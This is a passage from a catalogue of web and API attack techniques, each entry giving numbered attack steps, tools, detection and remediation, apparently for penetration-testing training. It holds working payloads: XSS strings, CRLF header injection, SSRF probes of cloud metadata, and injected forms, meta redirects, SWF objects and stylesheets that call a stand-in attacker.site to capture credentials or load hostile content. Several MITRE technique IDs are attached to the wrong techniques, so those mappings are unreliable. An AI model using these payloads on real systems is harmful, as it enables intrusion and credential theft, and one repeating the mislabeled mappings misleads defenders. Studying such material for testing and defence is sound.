- **Attack Steps**: Step 1: Scan known internal routes like /debug, /admin, /actuator, /env, /metrics, /health, /swagger-ui, /console. Step 2: If found, access without credentials to check if it’s publicly exposed. Step 3: Try triggering commands — e.g., in /env, modify properties; in /console, run database queries; in /debug, leak stack traces. Step 4: Use Google Dorks like inurl:/debug or inurl:/actuator/env to discover exposed endpoints. Step 5: Attempt SSRF or RCE if endpoints allow command or config injection. Step 6: If response returns sensitive info or code execution, confirm critical exposure. Step 7: Document the route, its access control (or lack), and impact. Step 8: Recommend firewall protection, authentication, or removing these endpoints in production. Step 9: Enable logging to detect unauthorized access. Step 10: Retest — endpoint must now return 403 or 404.
- **Detection**: Monitor for requests to /debug, /admin, etc.; alert on unauthenticated hits
- **Solution**: Disable or firewall off debug/admin endpoints; require authentication and IP restrictions
- **Tags**: Debug Endpoint Exposure, Internal APIs, Admin Backdoors

## Exploiting GraphQL Introspection to Discover Backend Services

- **Attack Type**: Recon via Schema Introspection
- **Target**: GraphQL APIs
- **Vulnerability**: Introspection enabled for unauthenticated users
- **MITRE**: T1592 – Gather Victim Host Information
- **Impact**: Full API map exposure, preparation for deeper attacks
- **Tools**: GraphiQL, graphql-introspection-cli
- **Scenario**: Attackers use GraphQL's built-in introspection query feature to enumerate backend services, database schema, field types, roles, and mutation operations.
- **Attack Steps**: Step 1: Open GraphiQL in browser or use Postman with GraphQL plugin. Step 2: Send introspection query like: {"query":"{ __schema { types { name fields { name type { name } } } } }"}. Step 3: If response includes full schema with queries, mutations, and field types, introspection is enabled. Step 4: Enumerate available queries like getUser, listSecrets, adminDashboard, etc. Step 5: Look for dangerous mutations like deleteUser, resetPassword, updateRole. Step 6: Check arguments accepted by these queries to craft specific exploits. Step 7: If no auth is required to run introspection, you now have a complete backend map. Step 8: Document fields, hidden entities, and accessible data types. Step 9: Recommend disabling introspection in production and enabling only for trusted roles. Step 10: Retest — schema fetch must now return access error.
- **Detection**: Log all introspection queries; alert if run without elevated role
- **Solution**: Disable introspection in prod; use allowlist schema control per role
- **Tags**: GraphQL Schema Recon, Introspection Abuse

## Unauthorized Access via Improper API Scope Validation

- **Attack Type**: Insufficient Scope Enforcement
- **Target**: OAuth-protected APIs
- **Vulnerability**: API does not verify token scopes
- **MITRE**: T1528 – Abuse Authentication Mechanism
- **Impact**: Unauthorized access to protected features or data
- **Tools**: JWT.io, Postman, Burp Suite, OAuth debugger
- **Scenario**: OAuth tokens often include scopes (e.g., read:user, write:admin). If APIs do not validate these scopes properly, attackers can call privileged endpoints with basic tokens.
- **Attack Steps**: Step 1: Capture an OAuth token from a legitimate login using browser DevTools or Burp. Step 2: Decode it on jwt.io and observe the scope or permissions fields. Step 3: Attempt to call admin or restricted API endpoints (e.g., /admin/delete, /config) using that token. Step 4: If access is granted, it means the API is not enforcing scopes. Step 5: Try modifying the token’s scope (if unsigned or weakly signed) to escalate privilege. Step 6: Use tools like Burp Intruder to fuzz endpoints with various low-privilege tokens. Step 7: Document endpoints that respond to invalid scope tokens. Step 8: Recommend strict backend scope validation on every endpoint. Step 9: Use middleware to enforce required scopes per route. Step 10: Retest — unauthorized tokens must now return HTTP 403 Forbidden.
- **Detection**: Monitor scope vs. access mapping in logs; alert on low-scope tokens accessing restricted endpoints
- **Solution**: Enforce strict scope validation on server side; apply fine-grained access checks
- **Tags**: OAuth Scope Misuse, Access Control Flaws, Priv Escalation

## Exploiting API Rate Limit Reset Flaws

- **Attack Type**: Token Bucket Reset Abuse
- **Target**: Any rate-limited API
- **Vulnerability**: Weak tracking of quota resets tied to spoofable data
- **MITRE**: T1498 – Network Denial of Service
- **Impact**: Brute-force, DoS, OTP flood, resource exhaustion
- **Tools**: Postman, Burp Suite, curl, Fiddler
- **Scenario**: Some APIs enforce rate limits using token buckets or fixed windows. If attackers can trigger a reset early (e.g., by reconnecting or rotating headers), they can make more requests than allowed.
- **Attack Steps**: Step 1: Identify an API endpoint that returns 429 Too Many Requests after excessive calls (e.g., /api/send_otp, /api/login). Step 2: Observe rate-limiting headers like X-RateLimit-Reset, Retry-After, or custom tokens. Step 3: Send rapid requests until limit is hit and record response headers. Step 4: Disconnect and reconnect, or rotate Authorization or custom header (e.g., X-Client-ID) to see if the limit resets prematurely. Step 5: Alternatively, change your User-Agent or X-Forwarded-For header and retry. Step 6: If the server resets your quota, rate limit is tied to those headers instead of IP or session. Step 7: Repeat steps to bypass rate limits consistently. Step 8: Recommend fixing rate limits at user or IP level with consistent tracking logic. Step 9: Apply retry delay strictly across all headers. Step 10: Retest — no early reset should occur after quota is hit.
- **Detection**: Log header/IP vs. quota use; alert on high variation of headers/IPs vs. same user
- **Solution**: Use server-side tracking by session/IP/device fingerprint; apply exponential backoff and quota decay
- **Tags**: Rate Limit Abuse, Token Reset Bypass, API Flooding

## SSRF via API Request Parameters

- **Attack Type**: Server-Side Request Forgery via User Input in API Params
- **Target**: APIs with URL-based input
- **Vulnerability**: Fetching user-supplied URLs without validation
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Internal service exposure, cloud metadata theft
- **Tools**: Burp Suite, curl, ngrok, Interact.sh
- **Scenario**: Some APIs fetch URLs, metadata, or images based on user-supplied parameters. If input is not sanitized, attackers can supply internal URLs leading to SSRF.
- **Attack Steps**: Step 1: Find an API endpoint that accepts URLs or hostnames (e.g., /api/fetch?url=..., /image/proxy?link=...). Step 2: Supply your own controlled server URL (e.g., using ngrok.io or Interact.sh). Step 3: If your server receives the request, API is performing SSRF. Step 4: Now test internal targets like http://localhost:80, http://127.0.0.1:9000, http://169.254.169.254/ (AWS metadata service). Step 5: Try internal subdomains like http://admin.internal, http://intranet.local. Step 6: If any return data (e.g., IAM creds from cloud metadata), it's a critical SSRF. Step 7: Try chaining with file://, ftp://, gopher:// if the parser allows. Step 8: Document vulnerable parameters. Step 9: Recommend input allowlist and no server-side fetch of untrusted URLs. Step 10: Retest — only whitelisted domains should now be accepted.
- **Detection**: Alert on requests to internal/reserved IPs or loopback via API logs
- **Solution**: Allow only whitelisted domains/IPs; restrict HTTP clients from reaching internal networks
- **Tags**: SSRF, Metadata Access, Internal Host Scan

## Exploiting API Throttling Bypass Using IP Rotation

- **Attack Type**: Rate Limiting Evasion via Spoofed or Rotated IPs
- **Target**: IP-restricted APIs
- **Vulnerability**: Trusting user-supplied headers for IP-based rate limits
- **MITRE**: T1583 – Evade Defensive Infrastructure
- **Impact**: API spam, OTP brute-force, DoS, account takeover
- **Tools**: Burp Suite, Tor, curl, proxychains, VPN
- **Scenario**: If APIs rely on IP-based throttling, attackers can use proxies, VPNs, or spoofing headers like X-Forwarded-For to rotate identity and bypass limits.
- **Attack Steps**: Step 1: Find an API endpoint protected by rate limiting (e.g., /api/register, /api/send_otp). Step 2: Use a proxy/VPN to change IP and repeat calls. Step 3: If rate limits reset, then the server is tracking usage only by IP. Step 4: Now spoof IP via header: X-Forwarded-For: 1.2.3.4. Step 5: Rotate this header to different values (1.2.3.5, 1.2.3.6, etc.) with each request. Step 6: Observe if rate limit is bypassed. Step 7: If server accepts spoofed headers, you can infinitely cycle and flood the API. Step 8: Automate the test using script with random IPs. Step 9: Recommend filtering headers at load balancer and enforcing real IP tracking. Step 10: Retest with spoofed headers — limits must now apply regardless of fake IPs.
- **Detection**: Compare IP header vs real client IP; monitor multiple X-Forwarded-For variations
- **Solution**: Strip spoofed headers unless from trusted proxies; track real IP from TCP not headers
- **Tags**: IP Rotation, XFF Spoofing, API Flood

## Manipulating API Response Headers for Cache Poisoning

- **Attack Type**: Cache Poisoning via Header Injection
- **Target**: Cached APIs or Redirects
- **Vulnerability**: Reflecting untrusted input into response headers
- **MITRE**: T1600 – Cache Poisoning
- **Impact**: Delivering malicious content via CDN or poisoning others
- **Tools**: Burp Suite, curl, browser dev tools
- **Scenario**: APIs returning user-controlled headers (Location, Content-Type, etc.) may poison caches (e.g., CDNs) and serve malicious content to other users.
- **Attack Steps**: Step 1: Find an API endpoint that reflects user input in response headers (e.g., /redirect?url=https://example.com). Step 2: Inject malicious values in header fields like Location, Content-Type, or ETag. Step 3: Example: send /redirect?url=https://evil.com%0D%0ALocation:%20https://malicious.site. Step 4: If the response includes an extra Location header, the server is vulnerable to header injection. Step 5: If CDN or caching layer stores this poisoned response, the next user will receive your injected header. Step 6: Try with Host, Cache-Control, or Set-Cookie. Step 7: If your values persist across sessions or users, poisoning is successful. Step 8: Recommend sanitizing all reflected header values and enforcing strict header policies. Step 9: Log which endpoints reflect header data. Step 10: Retest — headers must now be validated or stripped from input.
- **Detection**: Inspect caching logs; monitor header anomalies; check CDN cache state
- **Solution**: Sanitize input reflected in headers; avoid caching based on untrusted input
- **Tags**: HTTP Header Injection, Cache Abuse, CDN Poisoning

## Exploiting API Version Downgrade Attacks

- **Attack Type**: Version Confusion or Fallback to Insecure Versions
- **Target**: Multi-versioned APIs
- **Vulnerability**: Downgrading to legacy, insecure API versions
- **MITRE**: T1600 – Exploit Weak Default Config
- **Impact**: Authentication bypass, outdated validation logic used
- **Tools**: Postman, curl, Burp Suite
- **Scenario**: APIs supporting multiple versions may fall back to older, vulnerable versions if attacker changes version string or omits headers.
- **Attack Steps**: Step 1: Find API that supports versioning in headers (X-API-Version: v2) or URL (/v2/api/user). Step 2: Make valid request using v2, note the behavior and security (e.g., rate limits, validation). Step 3: Now change version to v1 or remove it entirely. Step 4: If request still succeeds or behaves differently (e.g., fewer security checks), version fallback is active. Step 5: Test older version for known issues (e.g., missing auth, weak input checks, verbose errors). Step 6: Try reusing same tokens or inputs in v1 vs v2. Step 7: If older version is less secure but still functional, it is vulnerable to downgrade attacks. Step 8: Log which versions exist and how fallbacks work. Step 9: Recommend strict version negotiation and deprecation of insecure versions. Step 10: Retest — old versions must now return 403 or be disabled completely.
- **Detection**: Compare response behavior across versions; alert on use of legacy version
- **Solution**: Reject unsupported versions; enforce strict API version headers; deprecate and block old APIs
- **Tags**: API Downgrade Attack, Version Spoofing, Legacy Abuse

## Basic HTML Injection into Comment or Profile Fields

- **Attack Type**: Stored HTML Injection
- **Target**: Web forms, comments
- **Vulnerability**: Rendering raw user HTML without sanitization
- **MITRE**: T1059.007 – JavaScript Execution
- **Impact**: XSS, UI manipulation, session theft
- **Tools**: Browser, Burp Suite, DevTools
- **Scenario**: User inputs HTML tags into comment or profile fields which are rendered unescaped in other users’ browsers, allowing content manipulation or XSS.
- **Attack Steps**: Step 1: Identify a form where users can submit profile info, comments, or feedback (e.g., /comment, /profile/update). Step 2: In the text field, inject simple HTML like <b>Hello</b> or <h1>Test</h1>. Step 3: Submit the form and reload the page. Step 4: If the injected HTML is rendered (e.g., text appears bold or large), the app is vulnerable to HTML Injection. Step 5: Now try script-capable HTML like <script>alert('XSS')</script> or <img src=x onerror=alert(1)>. Step 6: If executed, it's a Stored XSS. Step 7: Test if HTML is reflected in other users' views. Step 8: Document where unescaped rendering occurs. Step 9: Recommend escaping all user input before rendering. Step 10: Retest — HTML should now be shown as plain text, not rendered.
- **Detection**: Inspect DOM for injected HTML/scripts; alert on unsafe tag rendering
- **Solution**: Sanitize/escape user input before rendering; use output encoding (e.g., textContent vs innerHTML)
- **Tags**: Stored XSS, HTML Injection, DOM Abuse

## Injection of <iframe> for Phishing or Clickjacking

- **Attack Type**: UI Redressing and Embedded Page Hijack
- **Target**: Profile/comments UI
- **Vulnerability**: HTML Injection allowing <iframe> embedding
- **MITRE**: T1189 – Drive-by Compromise
- **Impact**: Credential theft, UI hijacking, phishing
- **Tools**: Browser DevTools, iframe generators
- **Scenario**: Attackers inject <iframe> elements to silently load malicious or login-mimicking sites, tricking users into interacting with invisible or overlayed content.
- **Attack Steps**: Step 1: Locate a comment, message, or profile section that reflects user input in rendered form. Step 2: Inject an iframe tag: <iframe src="https://phishing-site.com" width="100%" height="500"></iframe>. Step 3: If the iframe loads visually inside the app, the site reflects unsafe HTML and allows content framing. Step 4: Next, try invisible frame: <iframe src="https://attacker.site" width="100%" height="500" style="opacity:0;position:absolute;"></iframe>. Step 5: Use overlays or z-index to cover buttons or login forms (clickjacking). Step 6: If users can be tricked into clicking inside iframe thinking it's native UI, attack is successful. Step 7: Document injection point and DOM result. Step 8: Recommend use of X-Frame-Options and content security policies. Step 9: Block HTML tags in user inputs. Step 10: Retest — iframe must be stripped or ignored.
- **Detection**: Inspect for unexpected iframe loads in logs or DOM; monitor user sessions
- **Solution**: Strip/escape iframe tags in input; use CSP and X-Frame-Options: DENY headers
- **Tags**: HTML Injection, Iframe Abuse, Clickjacking, Phishing

## Injection of <img src=x onerror=alert(1)> for Stored XSS

- **Attack Type**: Stored XSS via Event Attributes in HTML Tags
- **Target**: Profile/comments pages
- **Vulnerability**: Stored XSS via unsafe HTML attribute injection
- **MITRE**: T1059.007 – JavaScript Execution
- **Impact**: Full XSS, session hijacking, defacement
- **Tools**: Burp Suite, Browser, Intercept Proxy
- **Scenario**: Injecting <img> tags with JavaScript in event attributes (like onerror) causes malicious scripts to run when the image fails to load, triggering XSS attacks.
- **Attack Steps**: Step 1: Open any page that reflects user content (e.g., bio, forum, product review). Step 2: Enter <img src=x onerror=alert('XSS')> as user input. Step 3: Submit the form or comment and reload the affected page. Step 4: If an alert box appears, the onerror script has executed, confirming stored XSS. Step 5: Try variations like onmouseover, onload, onclick. Step 6: Check if your script executes across different sessions or users. Step 7: Validate storage of the payload by viewing page source or inspecting network. Step 8: Recommend stripping event attributes from HTML input or using safe renderers. Step 9: Use libraries that sanitize HTML like DOMPurify. Step 10: Retest — script tags and event handlers must be removed or rendered inert.
- **Detection**: Alert on onerror, onclick presence in input or DOM; monitor for alert(1), eval(), script tags
- **Solution**: Use input validation and sanitization libraries; remove event-based attributes from user input
- **Tags**: Stored XSS, Event Handler Abuse, Image Injection

## Injection of <input autofocus> for UI Disruption

- **Attack Type**: UI Disruption via Autofocus
- **Target**: UI with editable bios
- **Vulnerability**: Rendering raw form elements with autofocus
- **MITRE**: T1200 – Input Capture via Form Injection
- **Impact**: Disrupted navigation, keyboard trap, UI confusion
- **Tools**: Browser DevTools, manual form testing
- **Scenario**: Attackers inject an <input> element with the autofocus attribute to hijack user keyboard control, break accessibility, or disrupt navigation.
- **Attack Steps**: Step 1: Locate a site feature that renders raw input (e.g., public bio, contact message, display name). Step 2: Inject: <input autofocus> or <textarea autofocus>. Step 3: Submit the form and reload the view page. Step 4: If your cursor is automatically placed inside your injected field and keyboard input is hijacked, autofocus injection worked. Step 5: Try combining with styles like position:fixed to trap focus. Step 6: Inject multiple autofocus elements and observe if they conflict, causing browser crash or jitter. Step 7: Try setting tabindex="0" to trap keyboard navigation. Step 8: Use screen reader tools to test accessibility disruption. Step 9: Recommend stripping input-related HTML from user fields. Step 10: Retest — form elements must be escaped or disabled in display logic.
- **Detection**: Visual inspection; monitor sudden cursor jumps or tab traps
- **Solution**: Block rendering of form elements from user input; enforce whitelist of safe tags
- **Tags**: UI Injection, Autofocus Trap, Accessibility Disruption

## Malicious use of <form action="evil.com"> for Credential Theft

- **Attack Type**: Credential Phishing via Form Injection
- **Target**: Forums, profiles, bios
- **Vulnerability**: Unfiltered form rendering with external action
- **MITRE**: T1204.001 – Malicious Form Input
- **Impact**: Credential theft, phishing, user trust abuse
- **Tools**: Burp Suite, Browser DevTools, Request Bin
- **Scenario**: Attacker injects malicious forms that mimic login or input fields. If submitted, data is sent to a third-party attacker-controlled site.
- **Attack Steps**: Step 1: Identify any HTML-rendering area in the app (e.g., user bio, signature, forum). Step 2: Inject: <form action="https://attacker.site" method="POST"><input name="user"><input name="pass"><input type="submit"></form>. Step 3: If the form appears and is functional, user data may be sent to the attacker when submitted. Step 4: Setup https://attacker.site to capture POST requests using RequestBin or webhook.site. Step 5: Ask another user to visit the page. Step 6: If they enter credentials and click submit, credentials will appear in your webhook logs. Step 7: Try using styles to mimic real login forms. Step 8: Recommend stripping <form> tags or sandboxing rendered user input. Step 9: Use Content Security Policy (CSP) to block form actions to external domains. Step 10: Retest — forms must now be stripped, neutralized, or sandboxed.
- **Detection**: Monitor DOM for unauthorized form actions; alert on submissions to external domains
- **Solution**: Sanitize all user input; use CSP to prevent form actions to untrusted domains
- **Tags**: Form Injection, HTML Abuse, Phishing Form

## Style Injection (<style>*{display:none}</style>) for UI Corruption

- **Attack Type**: UI Corruption via CSS Injection
- **Target**: Profile/comments forms
- **Vulnerability**: Rendering unfiltered <style> tags
- **MITRE**: T1200 – UI Manipulation
- **Impact**: Broken UI, hidden forms, phishing aid
- **Tools**: Burp Suite, Browser DevTools
- **Scenario**: Attacker injects malicious <style> tags to hide all elements or manipulate UI. Useful for hiding login forms, buttons, or triggering UI confusion in other users' browsers.
- **Attack Steps**: Step 1: Locate a user-editable input field rendered directly on the page (e.g., name, comment, feedback). Step 2: Inject <style>*{display:none}</style> and submit the form. Step 3: Reload the page or view as another user. Step 4: If the page appears blank or key UI components (like buttons, forms, menus) are missing, the injection worked. Step 5: Try targeting specific elements like form, input, button, or .login-form. Example: <style>form{display:none}</style>. Step 6: Use other CSS like position:absolute;top:-9999px to hide or displace elements. Step 7: Combine with phishing forms to mask real content. Step 8: Recommend escaping <style> tags or disallowing CSS in user input. Step 9: Retest after patch — malicious styles must be stripped or neutralized.
- **Detection**: DOM inspection for injected <style> tags; alert on large hidden DOM nodes
- **Solution**: Escape <style> tags; sanitize CSS input; use CSP to block inline styles
- **Tags**: CSS Injection, UI Disruption, Visual Manipulation

## <meta http-equiv="refresh"> for Auto-Redirect

- **Attack Type**: Meta Redirect Injection
- **Target**: Comments, bios, forums
- **Vulnerability**: Unescaped rendering of <meta> tags
- **MITRE**: T1189 – Drive-by Compromise
- **Impact**: Phishing, forced navigation, trust abuse
- **Tools**: Browser, RequestBin, Burp Suite
- **Scenario**: Attackers inject <meta> tags to auto-redirect users to malicious domains. Used for phishing, drive-by downloads, and session hijacking on shared terminals.
- **Attack Steps**: Step 1: Find a web app that renders user input in HTML without escaping (e.g., public comments, bios). Step 2: Inject: <meta http-equiv="refresh" content="2;url=https://attacker.site"> into the form. Step 3: Submit and reload the profile or comment page. Step 4: If the browser redirects to attacker.site after 2 seconds, the injection worked. Step 5: Shorten time to 0 for instant redirect. Step 6: Try obfuscating payload with extra spaces or case changes. Step 7: Monitor logs at attacker.site to confirm hits. Step 8: Recommend stripping or escaping all <meta> tags from user input. Step 9: Implement CSP to block meta refresh directives. Step 10: Retest — browser should not redirect via user input anymore.
- **Detection**: Monitor for multiple redirects in user profiles; analyze response headers and HTML meta tags
- **Solution**: Block or sanitize <meta> tags; use CSP: reflected-xss block; disable refresh via user content
- **Tags**: Meta Tag Injection, Auto Redirect, HTML Abuse

## <object data="evil.swf"> Injection for Flash Exploits (legacy)

- **Attack Type**: Legacy Flash Exploit via Object Injection
- **Target**: Legacy browser users
- **Vulnerability**: Unrestricted <object> with SWF loader
- **MITRE**: T1203 – Exploitation for Client Execution
- **Impact**: RCE via Flash, keylogging, persistence
- **Tools**: Internet Explorer (legacy), .swf payloads
- **Scenario**: In older browsers, injected <object> tags with Flash content could load and execute malicious .swf files, leading to full system compromise (RCE), drive-by downloads, or keyloggers.
- **Attack Steps**: Step 1: Find an app that renders raw HTML from user input (comments, bios, signatures). Step 2: Inject: <object data="https://attacker.site/evil.swf" type="application/x-shockwave-flash" width="0" height="0"></object>. Step 3: Submit the form and test on legacy browsers (e.g., IE 8–11). Step 4: If browser loads and runs the SWF file, Flash injection succeeded. Step 5: Use payloads with embedded keystroke loggers, JavaScript bridges, or exploit kits. Step 6: Test if other users visiting the page trigger the SWF silently. Step 7: Recommend disabling Flash at server level. Step 8: Filter <object>, <embed>, and Flash MIME types from user content. Step 9: Retest in legacy browser — SWF must not load. Step 10: Deploy CSP blocking object/embed types.
- **Detection**: Monitor for .swf file requests; inspect <object> DOM tags
- **Solution**: Remove Flash support from backend; block object tags; disable Flash MIME types
- **Tags**: Flash Exploit, Legacy Browser Injection, Object Abuse

## <link rel="stylesheet" href="evil.css"> for Style Abuse

- **Attack Type**: External CSS Injection
- **Target**: Profile/comments headers
- **Vulnerability**: Rendering of unvalidated external stylesheets
- **MITRE**: T1200 – UI/UX Manipulation
- **Impact**: Phishing, UI override, brand impersonation
- **Tools**: Custom evil.css, DevTools, RequestBin
- **Scenario**: Injecting <link> tags lets attackers apply external CSS from malicious servers, altering the page UI to hide content, mimic login pages, or perform clickjacking.
- **Attack Steps**: Step 1: Locate an input field rendered as HTML in output (e.g., profile header, signature). Step 2: Inject: <link rel="stylesheet" href="https://attacker.site/evil.css">. Step 3: Host a malicious CSS file on attacker.site with rules like * {display:none} or .login {position:absolute;top:0;z-index:999}. Step 4: Submit and view the page — if styling changes, link injection is working. Step 5: Use CSS to mimic real forms or move/replace elements (phishing UI). Step 6: Monitor requests from user browsers to your CSS server. Step 7: Recommend stripping <link> tags from user content. Step 8: Use CSP to block external styles. Step 9: Retest — remote CSS must not load or affect layout. Step 10: Ensure fallback to safe default styles.
- **Detection**: Detect requests to unknown CSS domains; monitor DOM styling anomalies
- **Solution**: Block <link> tag injection; use CSP to allow only internal stylesheets
- **Tags**: CSS Abuse, External Stylesheet Injection, Visual Hijack

## Injection of <marquee> or <blink> for Legacy Browser Attacks

- **Attack Type**: Legacy UI Attack via Deprecated HTML Tags
- **Target**: Public-facing user pages
- **Vulnerability**: Unsafe rendering of deprecated tags
- **MITRE**: T1600 – Visual Disruption
- **Impact**: UI/UX damage, accessibility harm, XSS vectors
- **Tools**: Browser, Legacy Mode, DevTools
- **Scenario**: Legacy tags like <marquee> or <blink> may cause screen flicker, distraction, epilepsy triggers, or script injection in old browsers due to poor handling.
- **Attack Steps**: Step 1: Identify any HTML-rendered input field (e.g., forums, signature, bio section). Step 2: Inject: <marquee behavior="alternate">Hacked!</marquee> or <blink>ALERT!</blink>. Step 3: Submit and reload the page. Step 4: If text scrolls or blinks, injection worked. Step 5: On older browsers, these may lead to DOM reflows or screen jitter, especially with nested tags. Step 6: Test combinations like <marquee><img src=x onerror=alert(1)></marquee> to check for event trigger bugs. Step 7: Evaluate accessibility and readability impact. Step 8: Recommend stripping deprecated tags like <blink>, <marquee>. Step 9: Deploy CSP and disable legacy HTML behaviors. Step 10: Retest — legacy tags must now be removed or escaped.
- **Detection**: Visual inspection; alert on use of deprecated HTML elements
- **Solution**: Strip deprecated tags; block their use at rendering engine or sanitize in server
- **Tags**: HTML Abuse, Deprecated Tags, UI Disruption

## Abuse of <a href="javascript:alert(1)">Click me</a>

- **Attack Type**: JavaScript URL Execution via Anchor HREF
- **Target**: User-rendered links
- **Vulnerability**: Rendering href="javascript:" unsanitized
- **MITRE**: T1059.007 – JavaScript Execution
- **Impact**: Click-based XSS, cookie theft, UI redirection
- **Tools**: Browser DevTools, Burp Suite
- **Scenario**: Attacker injects an anchor tag with href="javascript:...", which executes JS code when clicked. This can hijack user sessions, steal data, or manipulate DOM when clicked.
- **Attack Steps**: Step 1: Identify any area where user input is rendered as HTML (e.g., user bios, comments, signatures). Step 2: Inject: <a href="javascript:alert(1)">Click me</a> into the input field. Step 3: Submit the form and reload the page. Step 4: If the link appears and clicking it pops an alert box, the app is vulnerable to JavaScript execution via HREF. Step 5: Try more dangerous payloads like javascript:document.cookie to test cookie access. Step 6: Try injecting into <a> tags where only the URL is expected (like <a href="[input]">). Step 7: Recommend filtering or rejecting javascript: schemes. Step 8: Implement CSP: script-src 'self'; and disallow unsafe-inline. Step 9: Retest — JS links should now be blocked or removed.
- **Detection**: Look for links using javascript:; monitor inline JS triggered from anchor clicks
- **Solution**: Strip or block javascript: in links; use link sanitizer libs like DOMPurify
- **Tags**: HREF Injection, JS URL Abuse, Anchor Tag Exploit

## Bypassing Filters via Obfuscated JS URIs (e.g., java\u0000script:)

- **Attack Type**: Filter Bypass via Unicode/Null JS URI Injection
- **Target**: Anchor inputs in profiles
- **Vulnerability**: Poorly filtered/decoded javascript: links
- **MITRE**: T1203 – Exploit for Client Execution
- **Impact**: Filter evasion, XSS, user hijacking
- **Tools**: Burp Suite, Browser, FuzzDB
- **Scenario**: Attacker uses obfuscated or encoded javascript: URIs (e.g., null-byte in java\u0000script:) to bypass naive filters and execute JavaScript in browsers.
- **Attack Steps**: Step 1: Find a site that filters javascript: but allows anchor tags. Step 2: Inject obfuscated payloads like <a href="java&#x0000;script:alert(1)">Bypass</a> or <a href="java\u0000script:alert(1)">Bypass</a>. Step 3: Use Burp Suite or FuzzDB payloads to test various encodings. Step 4: If a browser executes JS when clicked, even though the input "looks safe," filter is bypassed. Step 5: Try &#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;: (full encoded) as well. Step 6: Observe browser behavior — Chrome/Firefox may auto-decode. Step 7: Document working variants and browser-specific behaviors. Step 8: Implement strict whitelisting (only http(s)://). Step 9: Use URL parsers to normalize and inspect before rendering. Step 10: Retest — obfuscations must now be blocked.
- **Detection**: Log unexpected URI schemes; use proxy to detect obfuscated or malformed JavaScript URIs
- **Solution**: Normalize all URLs, reject non-HTTP protocols, parse URIs before rendering
- **Tags**: JavaScript URI Obfuscation, Filter Evasion, Anchor Injection

## Embedding javascript: in image map coordinates

- **Attack Type**: JavaScript Execution via Image Map Injection
- **Target**: Clickable image areas
- **Vulnerability**: Allowing href="javascript:" in <area> tags
- **MITRE**: T1059.007 – JavaScript Execution
- **Impact**: XSS, cookie access, hidden attack surfaces
- **Tools**: Browser, Burp Suite, HTML Playground
- **Scenario**: Attackers inject javascript: URLs inside <map> elements used in clickable images. When clicked, JavaScript executes in the browser.
- **Attack Steps**: Step 1: Check if the app allows injection of custom HTML (e.g., profile section or comments). Step 2: Inject an image map: <img src="logo.png" usemap="#map"><map name="map"><area shape="rect" coords="0,0,82,126" href="javascript:alert('XSS')"></map>. Step 3: Submit and reload — click on the image. Step 4: If alert pops up, browser interpreted javascript: from <area href>. Step 5: Try other payloads like document.cookie or DOM modification. Step 6: Confirm whether different areas and images can be used to obfuscate intent. Step 7: Recommend stripping all <map> and <area> tags from user input. Step 8: Implement CSP blocking inline JS and JS URIs. Step 9: Use DOM sanitizers that remove usemap attributes. Step 10: Retest — no JS should execute via image maps.
- **Detection**: Audit rendered <area> hrefs; look for usemap + JS combo; monitor click handlers in DOM
- **Solution**: Filter javascript: in all links; remove map/image combos from user-controlled content
- **Tags**: JavaScript Map Injection, Image Click Exploit

## Injection via window.location.href or eval abuse

- **Attack Type**: JavaScript Execution via Dangerous API Injection
- **Target**: Dynamic JS pages
- **Vulnerability**: Unsafe use of eval() / window.location
- **MITRE**: T1059 – Command Execution
- **Impact**: Full JS execution, data theft, redirection
- **Tools**: DevTools, Burp Suite, Custom Scripts
- **Scenario**: Attacker controls input passed to window.location.href, eval(), or similar, causing code execution. Often occurs when devs use user input in JS without validation.
- **Attack Steps**: Step 1: Find a JS file or inline script using user input in eval() or window.location. Step 2: Test reflected values in URL like ?redirect=javascript:alert(1) or ?cmd=alert(1). Step 3: Try payloads such as eval(location.hash.slice(1)) with URL #alert(1). Step 4: If alert executes on page load or redirect, injection is possible. Step 5: Try input like "><script>eval('alert(1)')</script> if input is embedded in script blocks. Step 6: Analyze JS source via DevTools > Sources tab. Step 7: Identify any untrusted dynamic code execution (eval, setTimeout, Function). Step 8: Replace with safe alternatives like JSON.parse, strict URL validation. Step 9: Recommend CSP and disabling inline JS if possible. Step 10: Retest — no execution should happen with crafted inputs.
- **Detection**: Scan JS source for eval, new Function, or location.href usage; use dynamic analysis tools
- **Solution**: Avoid dynamic execution; validate input strictly; use safe APIs only
- **Tags**: Eval Abuse, Location Injection, JS RCE

## JavaScript Execution via Inline Event Handlers (onclick, onerror)

- **Attack Type**: Inline JS Execution via Attribute Injection
- **Target**: Profile forms, comments
- **Vulnerability**: HTML rendered with event attributes allowed
- **MITRE**: T1059.007 – JavaScript Execution
- **Impact**: Full XSS, session hijack, UI redressing
- **Tools**: Burp Suite, Chrome DevTools, Image links
- **Scenario**: Attacker injects HTML tags with onclick, onerror, or onload attributes that execute JavaScript when events trigger (e.g., image load error or button click).
- **Attack Steps**: Step 1: Find a field where raw HTML is rendered (e.g., bio, profile, post). Step 2: Inject payloads like <img src=x onerror=alert('XSS')> or <div onclick=alert('Click')>Click me</div>. Step 3: Submit and reload the affected page. Step 4: If alert executes when clicking or loading fails, injection succeeded. Step 5: Try different events like onload, onmouseover, onfocus, etc. Step 6: Chain this with DOM manipulation like stealing document.cookie or submitting hidden forms. Step 7: Observe HTML source — if events are preserved in DOM, the site is vulnerable. Step 8: Use libraries like DOMPurify to strip all inline event handlers. Step 9: Enforce CSP to block unsafe-inline. Step 10: Retest — DOM must not preserve injected JS events.
- **Detection**: Scan HTML for on*= patterns; use CSP violation logs to detect inline script usage
- **Solution**: Strip event attributes from user input; use libraries like DOMPurify; enable strong CSP
- **Tags**: Event Handler Injection, Inline JS, Attribute-Based XSS

## SVG <script> Execution in Inline SVG Code

- **Attack Type**: Inline Script Execution via SVG
- **Target**: HTML renderers
- **Vulnerability**: Inline SVG execution allowed with script tags
- **MITRE**: T1059.007 – JavaScript Execution
- **Impact**: Stored/Reflected XSS, cookie theft
- **Tools**: Browser DevTools, Burp Suite
- **Scenario**: Attackers embed SVG files directly in HTML with <script> tags inside. Browsers treat this as valid and execute the JavaScript, leading to full client-side code execution (XSS).
